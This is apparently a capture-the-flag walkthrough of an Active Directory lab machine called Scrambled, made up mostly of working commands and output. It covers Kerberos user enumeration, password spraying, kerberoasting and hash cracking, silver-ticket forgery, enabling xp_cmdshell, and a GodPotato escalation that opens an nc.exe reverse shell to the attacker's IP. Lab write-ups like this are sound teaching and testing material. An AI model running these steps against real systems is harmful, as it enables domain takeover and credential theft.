# Scrambled

```shellscript
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-01 14:51:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-12-01T14:53:07+00:00; +2s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-01T14:53:06+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-12-01T14:53:07+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-01T14:50:37
|_Not valid after:  2055-12-01T14:50:37
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-01T14:53:07+00:00; +2s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-01T14:53:06+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Get the name and domain of the machine

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb 10.10.11.168                                                         
SMB         10.10.11.168    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
```

Trying to look for shares, we get the error `STATUS_NOT_SUPPORTED`, which means NTLM authentication is disabled and we should continue with kerberos

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc1.scrm.local -u '' -p '' --shares 
SMB         10.10.11.168    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.10.11.168    445    DC1              [-] scrm.local\: STATUS_NOT_SUPPORTED
```

On the website, we find a page saying that when a password is reset, the password is the same as the username ⇒ if we find a user, we can test for username:username

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fpw0DqjAwt2d7KXVhtYEB%2Fimage.png?alt=media&#x26;token=9f25f98b-e03d-40f1-9081-3d74f8d1e763" alt=""><figcaption></figcaption></figure>

We will try to bruteforce users with kerbrute

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ kerbrute userenum -d scrm.local /usr/share/wordlists/statistically-likely-usernames/jsmith.txt --dc dc1.scrm.local 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 12/01/25 - Ronnie Flathers @ropnop

2025/12/01 10:04:19 >  Using KDC(s):
2025/12/01 10:04:19 >   dc1.scrm.local:88

2025/12/01 10:04:20 >  [+] VALID USERNAME:       asmith@scrm.local
2025/12/01 10:04:21 >  [+] VALID USERNAME:       jhall@scrm.local
2025/12/01 10:04:35 >  [+] VALID USERNAME:       sjenkins@scrm.local
2025/12/01 10:04:45 >  [+] VALID USERNAME:       ksimpson@scrm.local
2025/12/01 10:05:07 >  [+] VALID USERNAME:       khicks@scrm.local
```

Now that we have a list of users, try to password spray

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb DC1.scrm.local -u users -p users -k --no-bruteforce --continue-on-success
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [-] scrm.local\asmith:asmith KDC_ERR_PREAUTH_FAILED 
SMB         DC1.scrm.local  445    DC1              [-] scrm.local\jhall:jhall KDC_ERR_PREAUTH_FAILED 
SMB         DC1.scrm.local  445    DC1              [-] scrm.local\sjenkins:sjenkins KDC_ERR_PREAUTH_FAILED 
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson 
SMB         DC1.scrm.local  445    DC1              [-] scrm.local\khicks:khicks KDC_ERR_PREAUTH_FAILED
```

We get a hit on ksimpson:ksimpson

We will now generate a ticket and krb5 configuration file

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb DC1.scrm.local -k -u ksimpson -p 'ksimpson' --generate-krb5-file krb5.conf
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] krb5 conf saved to: krb5.conf
SMB         DC1.scrm.local  445    DC1              [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson

┌──(kali㉿kali)-[~/Downloads]
└─$ sudo cp krb5.conf /etc/krb5.conf
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat /etc/krb5.conf         
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SCRM.LOCAL

[realms]
    SCRM.LOCAL = {
        kdc = dc1.scrm.local
        admin_server = dc1.scrm.local
        default_domain = scrm.local
    }

[domain_realm]
    .scrm.local = SCRM.LOCAL
    scrm.local = SCRM.LOCAL
```

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ kinit ksimpson                                                                                                    
Password for ksimpson@SCRM.LOCAL: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ klist         
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
12/01/2025 10:21:37  12/01/2025 20:21:37  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 12/02/2025 10:21:32
```

We run bloodhound with rusthound, as it enables us to use with with kerberos

{% hint style="danger" %}
I had to put everything in uppercase for it to work or I had the error : `Error: GssapiOperationError("Unspecified GSS failure. Minor code may provide more information (Server not found in Kerberos database)")`
{% endhint %}

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ rusthound -d SCRM.LOCAL -f DC1.SCRM.LOCAL -k -z 
---------------------------------------------------
Initializing RustHound-CE at 10:30:45 on 12/01/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-12-01T15:30:49Z INFO  rusthound_ce::json::maker::common] .//20251201103049_scrm-local_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 10:30:49 on 12/01/25! Happy Graphing!
```

Using the `Shortest Path to DA from kerberoastable users`, we find the following path

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FJU7QihgCOI9lDkCmpq5s%2Fimage.png?alt=media&#x26;token=3eb536e9-ebd9-4707-9ef9-caea36ccc4bd" alt=""><figcaption></figcaption></figure>

We use impacket to confirm sqlsvc has an SPN. As `GetUserSPNs.py` is looking for a ccache file to use kerberos, we have to find the current one located in /tmp and export it to the KRB5CCNAME environment variable

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ klist 
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: ksimpson@SCRM.LOCAL

Valid starting       Expires              Service principal
12/01/2025 10:51:35  12/01/2025 20:51:35  krbtgt/SCRM.LOCAL@SCRM.LOCAL
        renew until 12/02/2025 10:51:31
        
┌──(kali㉿kali)-[~/Downloads]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000                                                   
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ GetUserSPNs.py -dc-host DC1.SCRM.LOCAL -k -no-pass SCRM.LOCAL/ksimpson@DC1.SCRM.LOCAL
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-12-01 09:50:31.376996             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-12-01 09:50:31.376996
```

We see sqlsvc has an SPN, let's get the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap DC1.SCRM.LOCAL -u 'ksimpson' -k --use-kcache --kerberoasting output
LDAP        DC1.SCRM.LOCAL  389    DC1              [*] None (name:DC1) (domain:SCRM.LOCAL) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1.SCRM.LOCAL  389    DC1              [+] SCRM.LOCAL\ksimpson from ccache 
LDAP        DC1.SCRM.LOCAL  389    DC1              [*] Skipping disabled account: krbtgt
LDAP        DC1.SCRM.LOCAL  389    DC1              [*] Total of records returned 1
LDAP        DC1.SCRM.LOCAL  389    DC1              [*] sAMAccountName: sqlsvc, memberOf: [], pwdLastSet: 2021-11-03 12:32:02.351452, lastLogon: 2025-12-01 09:50:31.376996
LDAP        DC1.SCRM.LOCAL  389    DC1              $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local\sqlsvc*$42b1eccc6a49203443b25bed75941154$56b51854c6bb9027ad6aad2c8b1fff623a8051f3ad06a1d15d70224e8b64a184fd1ed59d05bb06c3fff71df087c7b699beafeb60c8b774e08d14f5cc496447f2b2f45e50726f506c08199f65b9c8d812eb80268b0cf600b8fca4ff06890d8b131e693153aedeb3bc1492ac11e138a99e376313c8981fc66911fe60ccd62103937107104863fec66dd1357d56f26394cff351b3f3cce54e578f09b1834682efa059df3ec07048e635b9c01895b7b295a29381c93bd1c4a860674b35ee142697f0e6dacf87d59d0b233c41828262576781c0e00b31859f623033429771d028968cfd629cd2129f5044bc125ed12abb25fb758d8782061c9ccbc616606843a80e5a917e67e56825376628e35b816122a56ec8f057ea52b498392f38af2497603abf8841e9590f0a8fde749f3bd930969ceafa05746c81fcc220e85b05965668bc0ceec50f847c70b5d83ce7841ab085ba1681ba3e0c258d5379bffc08e5cbcf9459d876cd0f66a397550d0c4a0701858659ce870162e5441855b5e70484ce40c805a9739bfcf700970f91bb2276e445f8ac93cbd2d987e8024778081ef113303df912051bce54e487c336d4987c340caa11a7aa1cc4955b218174d442cbc4239f3361aae85d1509df0555f2de251864b2d2dc602cce41094503587fea269e3685ad7501e2e6969e39e2b03e0377ff0750085a017c25aca3c65b756364358922809836b13cb892d4d49a514d04641a9a9d23183f33632245e92df671460c5271281611cd744a09fb57a91f2d4a2c5c0b19fa68212584a3a13caa12b6913a85dd6470c1882fb8b20c8e7edbee3e8a2486517b794ac825373255194bbf930ac6916ad713309b0b8d26e16e8ae09aa51a9e96efc417bfc0e2f1df3fff44e2ce4b8355c7de03284870e902310860a66bb582a1646bb156cd0fc989275f8ec1ead91d6e0deaec553b9cee1bf9bd243cd2be72294163e5afca237e3b9669ba353d073d4f85c5eececf034397fd0f8e78f388ef4655e39b89d7506fda3a456820fe189aa1bbd3e472154459dca415417b6d9209cac9076d6280c52816a99ea110ab88fd593cf12f24abfe6a8b2f4887b6e7df3224574bc3cb33ef8b7449bb5715d922960f19311035c29345f1939999c9d381ac23c834b902dcdda8d360649db90d57c0ed8bb272878a9e7a06f3099fb736ff3bfb339d8d70060a583528845d7cb2b444a24a811b58497e3ba61b457c8f425ff8034ab3114680c66f8133291f4da51a55f43de01442455080955d3fdb583865b03e8230e53d8e5e8ee442812431d699d2fdd7f8f00cb60a0d862e7aafac856c5c495be7ed62d72ff7985b2f766e52fabc8bd2645a42c49453f5204622376127eec00984fde587a359ddd165ac2fffb3cb04d2d2a6a651357e79b9f818241c8f7afccaf390cf6d03181dcbd41d54
```

We crack the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 13100 '$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local\sqlsvc*$42b1eccc6a49203443b25bed75941154$56b51854c6bb9027ad6aad2c8b1fff623a8051f3ad06a1d15d70224e8b64a184fd1ed59d05bb06c3fff71df087c7b699beafeb60c8b774e08d14f5cc496447f2b2f45e50726f506c08199f65b9c8d812eb80268b0cf600b8fca4ff06890d8b131e693153aedeb3bc1492ac11e138a99e376313c8981fc66911fe60ccd62103937107104863fec66dd1357d56f26394cff351b3f3cce54e578f09b1834682efa059df3ec07048e635b9c01895b7b295a29381c93bd1c4a860674b35ee142697f0e6dacf87d59d0b233c41828262576781c0e00b31859f623033429771d028968cfd629cd2129f5044bc125ed12abb25fb758d8782061c9ccbc616606843a80e5a917e67e56825376628e35b816122a56ec8f057ea52b498392f38af2497603abf8841e9590f0a8fde749f3bd930969ceafa05746c81fcc220e85b05965668bc0ceec50f847c70b5d83ce7841ab085ba1681ba3e0c258d5379bffc08e5cbcf9459d876cd0f66a397550d0c4a0701858659ce870162e5441855b5e70484ce40c805a9739bfcf700970f91bb2276e445f8ac93cbd2d987e8024778081ef113303df912051bce54e487c336d4987c340caa11a7aa1cc4955b218174d442cbc4239f3361aae85d1509df0555f2de251864b2d2dc602cce41094503587fea269e3685ad7501e2e6969e39e2b03e0377ff0750085a017c25aca3c65b756364358922809836b13cb892d4d49a514d04641a9a9d23183f33632245e92df671460c5271281611cd744a09fb57a91f2d4a2c5c0b19fa68212584a3a13caa12b6913a85dd6470c1882fb8b20c8e7edbee3e8a2486517b794ac825373255194bbf930ac6916ad713309b0b8d26e16e8ae09aa51a9e96efc417bfc0e2f1df3fff44e2ce4b8355c7de03284870e902310860a66bb582a1646bb156cd0fc989275f8ec1ead91d6e0deaec553b9cee1bf9bd243cd2be72294163e5afca237e3b9669ba353d073d4f85c5eececf034397fd0f8e78f388ef4655e39b89d7506fda3a456820fe189aa1bbd3e472154459dca415417b6d9209cac9076d6280c52816a99ea110ab88fd593cf12f24abfe6a8b2f4887b6e7df3224574bc3cb33ef8b7449bb5715d922960f19311035c29345f1939999c9d381ac23c834b902dcdda8d360649db90d57c0ed8bb272878a9e7a06f3099fb736ff3bfb339d8d70060a583528845d7cb2b444a24a811b58497e3ba61b457c8f425ff8034ab3114680c66f8133291f4da51a55f43de01442455080955d3fdb583865b03e8230e53d8e5e8ee442812431d699d2fdd7f8f00cb60a0d862e7aafac856c5c495be7ed62d72ff7985b2f766e52fabc8bd2645a42c49453f5204622376127eec00984fde587a359ddd165ac2fffb3cb04d2d2a6a651357e79b9f818241c8f7afccaf390cf6d03181dcbd41d54' /usr/share/wordlists/rockyou.txt
```

sqlsvc:Pegasus60

We still can't connect to the mssql service

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ mssqlclient.py SCRM.LOCAL/sqlsvc@DC1.SCRM.LOCAL -k -no-pass -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ mssqlclient.py SCRM.LOCAL/sqlsvc@DC1.SCRM.LOCAL -k -no-pass              
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

We discover sqlsvc is in the `No Access` group, which probably prevents him from logging in

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F4uUXdscfB3cFVmLgJ4D5%2Fimage.png?alt=media&#x26;token=b5e46a49-2baa-4518-b628-07a36d576d4c" alt=""><figcaption></figcaption></figure>

As we can't use that user to login but have his service password, we can perform a Silver Ticket Attack

We get the domain SID

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap DC1.scrm.local -k -u sqlsvc -p 'Pegasus60' --get-sid 
LDAP        DC1.scrm.local  389    DC1              [*] None (name:DC1) (domain:scrm.local) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1.scrm.local  389    DC1              [+] scrm.local\sqlsvc:Pegasus60 
LDAP        DC1.scrm.local  389    DC1              Domain SID S-1-5-21-2743207045-1827831105-2542523200
```

Next, rid-brute force the users to get the RID of interesting groups

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb DC1.scrm.local -k -u sqlsvc -p 'Pegasus60' --rid-brute
SMB         DC1.scrm.local  445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\sqlsvc:Pegasus60 
SMB         DC1.scrm.local  445    DC1              498: SCRM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              500: SCRM\administrator (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              501: SCRM\Guest (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              502: SCRM\krbtgt (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              512: SCRM\Domain Admins (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              513: SCRM\Domain Users (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              514: SCRM\Domain Guests (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              515: SCRM\Domain Computers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              516: SCRM\Domain Controllers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              517: SCRM\Cert Publishers (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              518: SCRM\Schema Admins (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              519: SCRM\Enterprise Admins (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              520: SCRM\Group Policy Creator Owners (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              521: SCRM\Read-only Domain Controllers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              522: SCRM\Cloneable Domain Controllers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              525: SCRM\Protected Users (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              526: SCRM\Key Admins (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              527: SCRM\Enterprise Key Admins (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              553: SCRM\RAS and IAS Servers (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              571: SCRM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              572: SCRM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              1000: SCRM\DC1$ (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1101: SCRM\DnsAdmins (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              1102: SCRM\DnsUpdateProxy (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1106: SCRM\tstar (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1107: SCRM\asmith (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1109: SCRM\ProductionFloor1 (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1114: SCRM\ProductionShare (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1115: SCRM\AllUsers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1118: SCRM\sjenkins (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1119: SCRM\sdonington (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1120: SCRM\WS01$ (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1601: SCRM\backupsvc (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1603: SCRM\jhall (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1604: SCRM\rsmith (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1605: SCRM\ehooker (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1606: SCRM\SalesUsers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1608: SCRM\HRShare (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1609: SCRM\ITShare (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1610: SCRM\ITUsers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1611: SCRM\khicks (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1612: SCRM\SalesShare (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              1613: SCRM\sqlsvc (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1616: SCRM\SQLServer2005SQLBrowserUser$DC1 (SidTypeAlias)
SMB         DC1.scrm.local  445    DC1              1617: SCRM\miscsvc (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1619: SCRM\ksimpson (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              1620: SCRM\NoAccess (SidTypeGroup)
```

Craft the NTLM hash from the sqlsvc password. The NTLM is just the password in utf16 then applied the md4 function

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "Pegasus60" | iconv -t utf16le | openssl md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

Finally, we can craft our silver ticket, supplying the groups we should be part of

{% hint style="danger" %}
When forging tickets, before November 2021 updates, the `user-id` and `groups-ids` were useful but the `username` supplied was mostly useless. As of Nov. 2021 updates, if the `username` supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
{% endhint %}

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ticketer.py  -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -domain SCRM.LOCAL -spn MSSQLSvc/dc1.scrm.local:1433 Administrator -groups 512,1606,1608,1609,1610,1612
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SCRM.LOCAL/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

We can now export the ticket and login to the mssql service

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ export KRB5CCNAME=Administrator.ccache 
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ mssqlclient.py -k -no-pass DC1.SCRM.LOCAL                  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

We enable command execution

```shellscript
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> RECONFIGURE
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output        
-----------   
scrm\sqlsvc
```

We have SeImpersonatePrivilege enabled

```shellscript
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Transfer netcat and a potato to the target, execute and get a SYSTEM shell

```shellscript
SQL (SCRM\administrator  dbo@master)> xp_cmdshell C:\Users\sqlsvc\GodPotato-NET4.exe -cmd "cmd /c C:\Users\sqlsvc\nc.exe -e cmd.exe 10.10.16.3 443"

┌──(kali㉿kali)-[/opt/windows/potato]
└─$ nc -lnvp 443             
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.168] 57368
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
